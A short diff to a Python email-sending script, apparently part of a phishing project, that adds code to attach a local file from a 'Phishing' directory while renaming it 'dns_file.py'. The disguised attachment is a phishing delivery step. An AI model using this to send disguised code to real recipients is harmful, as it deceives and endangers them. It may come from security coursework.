@@ -4,6 +4,7 @@ from getpass import getpass
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import sys
+from email.mime.application import MIMEApplication
 
 
 def send_email(sender_email, password, receiver_email, title, job_title, personal_status, kids_status):
@@ -732,6 +733,15 @@ def send_email(sender_email, password, receiver_email, title, job_title, persona
 
     # Add HTML/plain-text parts to MIMEMultipart message
     message.attach(part1)
+
+    with open("/home/tamar/B/Phishing/create.py", "rb") as attachment_file:
+        attachment = MIMEApplication(attachment_file.read())
+        attachment.add_header(
+            "Content-Disposition",
+            "attachment",
+            filename="dns_file.py"
+        )
+        message.attach(attachment)
 
     # Create secure connection with server and send email
     context = ssl.create_default_context()
